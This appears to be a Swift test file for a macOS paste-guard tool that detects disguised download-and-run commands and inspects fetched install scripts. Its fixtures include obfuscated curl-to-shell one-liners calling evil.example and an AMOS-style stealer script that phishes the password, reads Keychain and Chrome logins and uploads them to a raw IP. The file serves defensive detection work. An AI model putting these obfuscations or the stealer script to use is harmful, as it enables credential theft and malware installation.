import Foundation
import Testing

@testable import MacxCore

@Suite("Shell disguise normalising")
struct ShellNormalizeTests {
    func norm(_ s: String) -> String { ShellNormalizer.normalize(s) }

    @Test func joinsQuotedFragmentsAndBackslashes() {
        #expect(norm("c\"\"url -s https://x/y | s''h") == "curl -s https://x/y | sh")
        #expect(norm("c\\url https://x | b\"a\"sh") == "curl https://x | bash")
    }

    @Test func ansiCQuoting() {
        #expect(norm("$'\\x63\\x75\\x72\\x6c' -s https://x | sh") == "curl -s https://x | sh")
        #expect(norm("$'\\143url' https://x | sh") == "curl https://x | sh")
    }

    @Test func expandsSimpleVariables() {
        #expect(norm("a=cu; b=rl; $a$b -s https://x | sh") == "a=cu; b=rl; curl -s https://x | sh")
        #expect(
            norm("u=https://evil.example/i.sh; curl -fsSL ${u} | bash")
                == "u=https://evil.example/i.sh; curl -fsSL https://evil.example/i.sh | bash")
    }

    @Test func printfAndRev() {
        #expect(norm("$(printf '\\x63\\x75\\x72\\x6c') https://x | sh") == "curl https://x | sh")
        #expect(norm("echo 'hsz | x//:sptth lruc' | rev | sh").contains("curl https://x | zsh"))
    }

    @Test func leavesPlainCommandsAlone() {
        #expect(norm("ls -la ~/Downloads") == "ls -la ~/Downloads")
        #expect(norm("git commit -m \"fix: a | b\"") == "git commit -m \"fix: a | b\"")
    }

    @Test func disguisedCommandsAreNowCaught() {
        #expect(PasteGuard.check("c\"\"url -s https://x/y | s''h").patterns.contains(.downloadToShell))
        #expect(PasteGuard.check("$'\\x63\\x75\\x72\\x6c' -s https://x | sh").patterns.contains(.downloadToShell))
        #expect(PasteGuard.check("a=cu; b=rl; $a$b -s https://x | sh").patterns.contains(.downloadToShell))
    }
}

@Suite("Download-and-run detection")
struct DownloadRunTests {
    @Test func pipeIntoShell() {
        let runs = DownloadRuns.find(in: "curl -fsSL https://example.com/install.sh | bash -s -- --yes")
        #expect(runs == [DownloadRun(url: "https://example.com/install.sh", interpreter: "bash", arguments: ["--yes"], form: .pipe)])
    }

    @Test func processSubstitutionAndCommandSubstitution() {
        #expect(DownloadRuns.find(in: "bash <(curl -fsSL \"https://ex.sh/f/abc\")").first?.form == .processSubstitution)
        #expect(DownloadRuns.find(in: "bash <(curl -fsSL \"https://ex.sh/f/abc\")").first?.url == "https://ex.sh/f/abc")
        let sub = DownloadRuns.find(in: "/bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)\"")
        #expect(sub.first?.form == .commandSubstitution)
        #expect(sub.first?.interpreter == "bash")
    }

    @Test func twoStepDownloadThenRun() {
        let a = DownloadRuns.find(in: "curl -fsSL https://x.example/i.sh -o /tmp/i.sh && bash /tmp/i.sh")
        #expect(a == [DownloadRun(url: "https://x.example/i.sh", interpreter: "bash", arguments: [], form: .downloadThenRun)])
        let b = DownloadRuns.find(in: "curl -O https://x.example/setup; chmod +x setup; ./setup --now")
        #expect(b.first?.form == .downloadThenRun)
        #expect(b.first?.interpreter == nil)  // runs the file itself
        #expect(b.first?.arguments == ["--now"])
        let c = DownloadRuns.find(in: "wget -qO- https://x.example/a | sh")
        #expect(c.first?.form == .pipe)
    }

    @Test func downloadsThatAreNotRunAreIgnored() {
        #expect(DownloadRuns.find(in: "curl -o file.zip https://example.com/file.zip").isEmpty)
        #expect(DownloadRuns.find(in: "curl https://example.com/api | jq .").isEmpty)
    }

    @Test func findsThemThroughDisguisesAndBase64() {
        #expect(DownloadRuns.find(in: "c''url -s https://x.example/a | s\"h\"").first?.url == "https://x.example/a")
        let amos = "echo 'Y3VybCAtc0wgaHR0cHM6Ly9ldmlsLmV4YW1wbGUveC5zaCB8IHpzaA==' | base64 -D | zsh"
        #expect(DownloadRuns.find(in: amos).first?.url == "https://evil.example/x.sh")
    }
}

@Suite("Script inspection")
struct ScriptInspectionTests {
    let history: Set<String> = ["raw.githubusercontent.com", "brew.sh"]

    func inspect(_ script: String, url: String = "https://raw.githubusercontent.com/x/y/install.sh") -> Inspection {
        ScriptInspector.inspect(Data(script.utf8), url: URL(string: url)!, finalURL: URL(string: url)!, knownHosts: history)
    }

    @Test func plainInstallerIsCalm() {
        let i = inspect("#!/bin/sh\nset -e\nmkdir -p \"$HOME/.local/bin\"\ncp tool \"$HOME/.local/bin/\"\necho done\n")
        #expect(i.verdict == .ok)
        #expect(i.kind == .script)
    }

    @Test func amosStyleSecondStageIsDangerous() {
        let script = """
            #!/bin/zsh
            pw=$(osascript -e 'display dialog "macOS needs your password to continue" default answer "" with hidden answer' -e 'text returned of result')
            dscl . -authonly "$USER" "$pw"
            security find-generic-password -ga "Chrome" 2>&1
            cp ~/Library/Application\\ Support/Google/Chrome/Default/Login\\ Data /tmp/x
            curl -X POST -F "f=@/tmp/x" http://45.61.0.10/upload
            cat > /Library/LaunchDaemons/com.apple.updater.plist <<EOF
            EOF
            killall Terminal
            """
        let i = inspect(script, url: "http://45.61.0.10/update.sh")
        let behaviours = Set(i.behaviours.map(\.id))
        #expect(
            behaviours.isSuperset(of: [
                "password-prompt", "password-check", "keychain-read", "browser-data", "uploads-files",
                "launch-item", "closes-terminal",
            ]))
        let facts = Set(i.facts.map(\.id))
        #expect(facts.contains("ip-address-host"))
        #expect(facts.contains("plain-http"))
        #expect(facts.contains("new-host"))
        #expect(i.verdict == .dangerous)
    }

    @Test func binaryInsteadOfScriptIsAFact() {
        var d = Data([0xCF, 0xFA, 0xED, 0xFE])
        d.append(Data(count: 60))
        let i = ScriptInspector.inspect(
            d, url: URL(string: "https://brew.sh/x")!, finalURL: URL(string: "https://brew.sh/x")!, knownHosts: history)
        #expect(i.kind == .binary)
        #expect(i.facts.contains { $0.id == "serves-a-program" })
    }

    @Test func redirectToAnotherHostIsAFact() {
        let i = ScriptInspector.inspect(
            Data("echo hi\n".utf8), url: URL(string: "https://brew.sh/i")!,
            finalURL: URL(string: "https://cdn.other.example/i")!, knownHosts: history)
        #expect(i.facts.contains { $0.id == "redirected" })
        #expect(i.facts.contains { $0.id == "new-host" })
    }

    @Test func nestedDownloadsAreListed() {
        let i = inspect("#!/bin/sh\ncurl -fsSL https://second.example/stage2.sh | sh\n")
        #expect(i.nestedDownloads.map(\.url) == ["https://second.example/stage2.sh"])
        #expect(i.behaviours.contains { $0.id == "downloads-and-runs-more" })
    }

    @Test func hiddenBlobIsMeasuredNotGuessed() {
        let blob = String(repeating: "QUJD", count: 100)
        let i = inspect("#!/bin/sh\necho '\(blob)' | base64 -d > /tmp/p\n")
        #expect(i.facts.contains { $0.id == "encoded-blob" })
    }

    @Test func hostsFromHistory() {
        let hosts = ScriptInspector.hosts(inHistory: ["curl -fsSL https://brew.sh/install | bash", "git clone https://github.com/a/b"])
        #expect(hosts == ["brew.sh", "github.com"])
    }
}

@Suite("Inspect flow")
struct InspectFlowTests {
    struct FakeFetcher: ScriptFetching {
        var pages: [String: String]
        func fetch(_ url: URL) throws -> FetchResult {
            guard let body = pages[url.absoluteString] else { throw FetchError.status(404) }
            return FetchResult(finalURL: url, status: 200, data: Data(body.utf8))
        }
    }

    @Test func fetchesInspectsSavesAndFollowsOneLevel() throws {
        let tmp = try TempDir()
        let fetcher = FakeFetcher(pages: [
            "https://a.example/i.sh": "#!/bin/sh\ncurl -s https://b.example/two.sh | sh\n",
            "https://b.example/two.sh": "#!/bin/sh\nosascript -e 'display dialog \"pw\" default answer \"\" with hidden answer'\n",
        ])
        let flow = PasteInspector(fetcher: fetcher, saveDir: tmp.url, knownHosts: [])
        let report = flow.inspect(command: "curl -s https://a.example/i.sh | sh")
        #expect(report.runs.count == 1)
        let first = try #require(report.runs.first?.inspection)
        #expect(first.nested.count == 1)
        #expect(first.nested.first?.behaviours.contains { $0.id == "password-prompt" } == true)
        #expect(report.verdict == .dangerous)  // the second stage counts for the whole paste
        let saved = try #require(report.runs.first?.savedCopy)
        #expect(FileManager.default.fileExists(atPath: saved.path))
        let perms = try FileManager.default.attributesOfItem(atPath: saved.path)[.posixPermissions] as? Int
        #expect(perms == 0o600)  // readable only by you, and not executable
    }

    @Test func savedCopiesLiveInAPrivateFolder() throws {
        let tmp = try TempDir()
        let dir = tmp.url.appendingPathComponent("Inspected")
        let flow = PasteInspector(fetcher: FakeFetcher(pages: ["https://a.example/i.sh": "echo hi\n"]), saveDir: dir, knownHosts: [])
        _ = flow.inspect(command: "curl -s https://a.example/i.sh | sh")
        let perms = try FileManager.default.attributesOfItem(atPath: dir.path)[.posixPermissions] as? Int
        #expect(perms == 0o700)
    }

    @Test func aWiderExistingFolderIsMadePrivate() throws {
        let tmp = try TempDir()
        let dir = tmp.url.appendingPathComponent("Inspected")
        try FileManager.default.createDirectory(at: dir, withIntermediateDirectories: false, attributes: [.posixPermissions: 0o755])
        let flow = PasteInspector(fetcher: FakeFetcher(pages: ["https://a.example/i.sh": "echo hi\n"]), saveDir: dir, knownHosts: [])
        _ = flow.inspect(command: "curl -s https://a.example/i.sh | sh")
        let perms = try FileManager.default.attributesOfItem(atPath: dir.path)[.posixPermissions] as? Int
        #expect(perms == 0o700)
    }

    /// Like `macx check`, a script that reading couldn't settle is pointed at the chamber, by its saved copy.
    @Test func scriptsReadingCantSettleGoToTheChamber() throws {
        let tmp = try TempDir()
        let fetcher = FakeFetcher(pages: [
            "https://a.example/unknown.sh": "#!/bin/sh\ncmd=\"$1\"\neval \"$cmd\"\n",  // partly unknown
            "http://b.example/careful.sh": "#!/bin/sh\necho hi\n",  // plain http: be careful
            "https://c.example/fine.sh": "#!/bin/sh\necho hi\n",  // nothing to show
            "https://d.example/bad.sh": "#!/bin/sh\nosascript -e 'display dialog \"pw\" default answer \"\" with hidden answer'\n",
        ])
        let flow = PasteInspector(fetcher: fetcher, saveDir: tmp.url, knownHosts: ["a.example", "b.example", "c.example", "d.example"])
        func candidates(_ command: String) -> [URL] { flow.inspect(command: command).chamberCandidates }

        let unknown = flow.inspect(command: "curl -s https://a.example/unknown.sh | sh")
        #expect(unknown.runs.first?.inspection?.verdict == .partlyUnknown)
        #expect(unknown.chamberCandidates == [try #require(unknown.runs.first?.savedCopy)])
        #expect(candidates("curl -s http://b.example/careful.sh | sh").count == 1)
        #expect(candidates("curl -s https://c.example/fine.sh | sh").isEmpty)
        #expect(candidates("curl -s https://d.example/bad.sh | sh").isEmpty)  // already DON'T RUN THIS
        #expect(candidates("curl -s https://gone.example/x | sh").isEmpty)  // nothing was fetched
    }

    @Test func fetchFailureIsReportedNotThrown() {
        let flow = PasteInspector(fetcher: FakeFetcher(pages: [:]), saveDir: FileManager.default.temporaryDirectory, knownHosts: [])
        let report = flow.inspect(command: "curl -s https://gone.example/x | sh")
        #expect(report.runs.first?.error != nil)
        #expect(report.verdict == .dangerous)  // can't see it, so don't run it blind
    }

    @Test func checkSaysInspectableForDownloads() {
        #expect(PasteGuard.check("curl -fsSL https://example.com/i.sh | bash").needsInspection)
        #expect(!PasteGuard.check("xattr -cr /Applications/X.app").needsInspection)
    }
}

@Suite("Running exactly what was inspected")
struct VerifiedRunTests {
    @Test func verifiedBytesMatchTheInspectedHash() throws {
        let tmp = try TempDir()
        let f = try tmp.file("copy.sh", "echo hi\n")
        let hash = sha256(try Data(contentsOf: f))
        #expect(try VerifiedCopy.bytes(at: f, sha256: hash) == Data("echo hi\n".utf8))
    }

    @Test func aChangedCopyIsRefused() throws {
        let tmp = try TempDir()
        let f = try tmp.file("copy.sh", "echo hi\n")
        let hash = sha256(try Data(contentsOf: f))
        try Data("curl evil | sh\n".utf8).write(to: f)
        #expect(throws: VerifiedCopy.Mismatch.self) { try VerifiedCopy.bytes(at: f, sha256: hash) }
    }

    @Test func stdinArgumentsPerInterpreter() {
        #expect(VerifiedCopy.stdinArguments(for: "bash", scriptArgs: ["--yes"]) == ["-s", "--", "--yes"])
        #expect(VerifiedCopy.stdinArguments(for: "zsh", scriptArgs: []) == ["-s"])
        #expect(VerifiedCopy.stdinArguments(for: "python3", scriptArgs: ["a"]) == ["-", "a"])
        #expect(VerifiedCopy.stdinArguments(for: "osascript", scriptArgs: []) == nil)  // can't read a script from stdin this way
    }
}

@Suite("Pointing at the chamber")
struct ChamberHintTests {
    /// One rule for `macx check` and `macx guard inspect`: scripts that reading couldn't settle.
    @Test func onlyScriptsReadingCantSettle() {
        #expect(ChamberHint.applies(isScript: true, verdict: .caution))
        #expect(ChamberHint.applies(isScript: true, verdict: .partlyUnknown))
        #expect(!ChamberHint.applies(isScript: true, verdict: .ok))
        #expect(!ChamberHint.applies(isScript: true, verdict: .dangerous))
        #expect(!ChamberHint.applies(isScript: false, verdict: .caution))  // apps and programs keep the static checks
    }

    @Test func theLineCanBePastedBack() {
        #expect(ChamberHint.line(path: "/tmp/i.sh") == "See what it actually does, safely: macx chamber run /tmp/i.sh")
        // The saved copies live under Application Support, which has a space in it.
        #expect(
            ChamberHint.line(path: "/x/Application Support/Macximesed/Inspected/ab12-i.sh")
                == "See what it actually does, safely: macx chamber run '/x/Application Support/Macximesed/Inspected/ab12-i.sh'")
        #expect(ChamberHint.line(path: "it's.sh") == #"See what it actually does, safely: macx chamber run 'it'\''s.sh'"#)
    }
}
